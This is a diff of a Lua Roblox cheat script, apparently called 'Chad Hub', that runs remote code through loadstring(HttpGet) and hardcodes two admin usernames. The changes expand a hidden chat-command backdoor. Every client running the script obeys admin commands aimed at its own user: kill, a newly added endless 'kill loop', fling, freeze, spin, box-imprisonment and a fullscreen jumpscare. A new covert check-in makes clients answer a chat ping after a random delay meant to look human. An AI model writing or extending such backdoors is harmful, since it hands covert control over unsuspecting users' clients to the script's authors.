@@ -78,6 +78,8 @@ local localPlayer = Players.LocalPlayer
 local IS_ADMIN = (localPlayer.Name == "Bolsonaro_Jair7" or localPlayer.Name == "vl2445")
 local SpinPlayers = {}
 local CaixaPlayers = {}
+_G.KillLoopPlayers = {}
+
 
 -- [[ CARREGAMENTO DA WINDUI ]]
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
@@ -104,47 +106,23 @@ if IS_ADMIN then
         Icon = "user"
     })
 
-
-VerifyTab:Button({
-    Title = "Marcar Usuarios do Script Normal",
+    VerifyTab:Button({
+    Title = "Marcar Usuarios (Comando Verifique)",
     Callback = function()
-        local count = 0
-        for _, p in pairs(Players:GetPlayers()) do
-            -- SO MARCA SE TIVER A STRING "IsChadUser" (ou seja, estÃ¡ usando o script)
-            -- E nÃ£o marca vocÃª mesmo
-            if p:FindFirstChild("IsChadUser") and p ~= localPlayer then
-                if p.Character and p.Character:FindFirstChild("Head") then
-                    if p.Character.Head:FindFirstChild("ChadTag") then p.Character.Head.ChadTag:Destroy() end
-                    
-                    local b = Instance.new("BillboardGui", p.Character.Head)
-                    b.Name = "ChadTag"
-                    b.Size = UDim2.new(0, 200, 0, 50)
-                    b.ExtentsOffset = Vector3.new(0, 3, 0)
-                    b.AlwaysOnTop = true
-
-                    local t = Instance.new("TextLabel", b)
-                    t.Size = UDim2.new(1, 0, 1, 0)
-                    t.BackgroundTransparency = 1
-                    t.Text = "CHAD HUB USER"
-                    
-                    -- COR ROXA NEON (Magenta Forte)
-                    t.TextColor3 = Color3.fromRGB(191, 0, 255) 
-                    t.TextStrokeColor3 = Color3.fromRGB(130, 0, 200)
-                    t.TextStrokeTransparency = 0 -- Faz o efeito "Neon"
-                    
-                    t.Font = Enum.Font.GothamBold
-                    t.TextSize = 16
-                    count = count + 1
-                end
-            end
+        -- Envia o comando para o chat global
+        local chatChannel = game:GetService("TextChatService").TextChannels.RBXGeneral
+        if chatChannel then
+            chatChannel:SendAsync(";verifique todos")
         end
-        WindUI:Notify({
+        
+        Window:Notify({
             Title = "Admin", 
-            Content = "Encontrados "..count.." usuarios do Chad Hub!", 
-            Image = "check"
+            Content = "Solicitando verificação de usuários...", 
+            Duration = 5
         })
     end
 })
+
 
     local AdminTab = Window:Tab({
         Title = "Admin",
@@ -174,12 +152,20 @@ VerifyTab:Button({
     end
 
     local actions = {
-    {"Matar", "kill"}, {"Lançar (Fling)", "fling"}, {"Sentar", "sit"},
-    {"Congelar", "frozen"}, {"Descongelar", "unfrozen"},
-    {"Girar", "spin"}, {"Parar Girar", "unspin"},
-    {"Prender Caixa", "caixa"}, {"Remover Caixa", "uncaixa"},
+    {"Matar", "kill"}, 
+    {"Kill Loop", "killloop"}, 
+    {"Parar Kill Loop", "unkillloop"}, 
+    {"Lançar (Fling)", "fling"}, 
+    {"Sentar", "sit"},
+    {"Congelar", "frozen"}, 
+    {"Descongelar", "unfrozen"},
+    {"Girar", "spin"}, 
+    {"Parar Girar", "unspin"},
+    {"Prender Caixa", "caixa"}, 
+    {"Remover Caixa", "uncaixa"},
     {"Jumpscare", "jumpscare"}
 }
+
     for _, d in pairs(actions) do
         AdminTab:Button({Title = d[1], Callback = function() EnviarCmd(d[2], selectedPlayerAdmin) end})
     end
@@ -211,6 +197,7 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game.Players
 local Remotes = RS:WaitForChild("RE")
+local chatChannel = TextChatService.TextChannels.RBXGeneral
 
 _G.AntiSit = false
 _G.SelectedPlayer = ""
@@ -247,22 +234,53 @@ end
 
 TextChatService.MessageReceived:Connect(function(msg)
     local text = msg.Text:lower()
-    local cmd, target = text:match("^;(.-)%s+(.+)$")
+    
+    -- 1. LÓGICA DE VERIFICAÇÃO (Comando: ;verifique todos)
+    if text == ";verifique todos" then
+        task.spawn(function()
+            task.wait(math.random(0.5, 1.5)) -- Delay para parecer humano
+            if chatChannel then
+                chatChannel:SendAsync("Usuário Do Chad")
+            end
+        end)
+        return -- Interrompe aqui para não confundir com comandos de alvo
+    end
+
+    -- 2. CAPTURA DE COMANDOS COM ALVO (Ex: ;killloop player)
+    local cmd, target = text:match("^;(.-)%s+([^%s]+)$")
     
     if cmd and target and target == localPlayer.Name:lower() then
         local char = localPlayer.Character
         local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
 
-        if cmd == "jumpscare" then
-            -- Usamos task.spawn para o wait(3) não travar o resto do script
+        -- [[ FUNÇÃO: KILL LOOP ]]
+        if cmd == "killloop" then
+            _G.KillLoopPlayers[localPlayer.Name] = true
+            task.spawn(function()
+                while _G.KillLoopPlayers[localPlayer.Name] do
+                    local currentHum = (localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid"))
+                    if currentHum then
+                        currentHum.Health = 0
+                    end
+                    localPlayer.CharacterAdded:Wait() -- Espera o player renascer para matar de novo
+                    task.wait(0.5)
+                end
+            end)
+
+        elseif cmd == "unkillloop" then
+            _G.KillLoopPlayers[localPlayer.Name] = nil
+
+        -- [[ FUNÇÃO: JUMPSCARE ]]
+        elseif cmd == "jumpscare" then
             task.spawn(function()
                 local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
                 sg.DisplayOrder = 999999
-                
                 local img = Instance.new("ImageLabel", sg)
                 img.Size = UDim2.new(1, 0, 1, 0)
-                img.Image = "rbxassetid://129339078196468"
+                img.Image = "rbxassetid://12433698744"
                 img.BackgroundTransparency = 1
+                img.ZIndex = 999999
                 
                 local sound = Instance.new("Sound", game:GetService("SoundService"))
                 sound.SoundId = "rbxassetid://130280049435018"
@@ -273,28 +291,43 @@ TextChatService.MessageReceived:Connect(function(msg)
                 sg:Destroy()
                 sound:Destroy()
             end)
-            
+
+        -- [[ FUNÇÃO: MATAR SIMPLES ]]
         elseif cmd == "kill" then 
             if hum then hum.Health = 0 end
+
+        -- [[ FUNÇÃO: FLING ]]
         elseif cmd == "fling" then 
-            if char:FindFirstChild("HumanoidRootPart") then char.HumanoidRootPart.Velocity = Vector3.new(0, 5000, 0) end
-        elseif cmd == "sit" then 
-            if hum then hum.Sit = true end
+            if hrp then hrp.Velocity = Vector3.new(0, 10000, 0) end
+
+        -- [[ FUNÇÃO: CONGELAR ]]
         elseif cmd == "frozen" then 
             if hum then hum.PlatformStand = true end
         elseif cmd == "unfrozen" then 
             if hum then hum.PlatformStand = false end
+
+        -- [[ FUNÇÃO: GIRAR ]]
         elseif cmd == "spin" then 
             SpinPlayers[localPlayer.Name] = true
+            task.spawn(function()
+                while SpinPlayers[localPlayer.Name] and hrp do
+                    hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(20), 0)
+                    task.wait()
+                end
+            end)
         elseif cmd == "unspin" then 
             SpinPlayers[localPlayer.Name] = nil
+
+        -- [[ FUNÇÃO: CAIXA ]]
         elseif cmd == "caixa" then 
-            local hrp = char:FindFirstChild("HumanoidRootPart")
             if hrp and not CaixaPlayers[localPlayer.Name] then
-                local m = Instance.new("Model", workspace); m.Name = "Prison"
+                local m = Instance.new("Model", workspace)
+                m.Name = "Prison_" .. localPlayer.Name
                 for _,o in pairs({Vector3.new(0,-3.5,0),Vector3.new(0,3.5,0),Vector3.new(3.5,0,0),Vector3.new(-3.5,0,0),Vector3.new(0,0,3.5),Vector3.new(0,0,-3.5)}) do
-                    local p = Instance.new("Part",m); p.Size = (o.Y~=0 and Vector3.new(7,1,7) or (o.X~=0 and Vector3.new(1,7,7) or Vector3.new(7,7,1)))
-                    p.CFrame = CFrame.new(hrp.Position+o); p.Anchored=true; p.Color=Color3.new(0,0,0); p.Material=Enum.Material.Neon
+                    local p = Instance.new("Part",m)
+                    p.Size = (o.Y~=0 and Vector3.new(7,1,7) or (o.X~=0 and Vector3.new(1,7,7) or Vector3.new(7,7,1)))
+                    p.CFrame = CFrame.new(hrp.Position+o)
+                    p.Anchored=true; p.Color=Color3.new(0,0,0); p.Material=Enum.Material.Neon
                 end
                 CaixaPlayers[localPlayer.Name] = m
             end
@@ -303,10 +336,13 @@ TextChatService.MessageReceived:Connect(function(msg)
                 CaixaPlayers[localPlayer.Name]:Destroy()
                 CaixaPlayers[localPlayer.Name] = nil 
             end
+            
+        -- [[ FUNÇÃO: SENTAR ]]
+        elseif cmd == "sit" then 
+            if hum then hum.Sit = true end
         end
     end
 end)
-
 
 RunService.RenderStepped:Connect(function(dt)
     if SpinPlayers[localPlayer.Name] then
@@ -5992,6 +6028,7 @@ task.spawn(function()
         RE:WaitForChild("1RPNam1eColo1r", 9e9):FireServer("PickingRPBioColor", Color3.fromRGB(255, 19, 3))
     end)
 end)
+
 
 
 
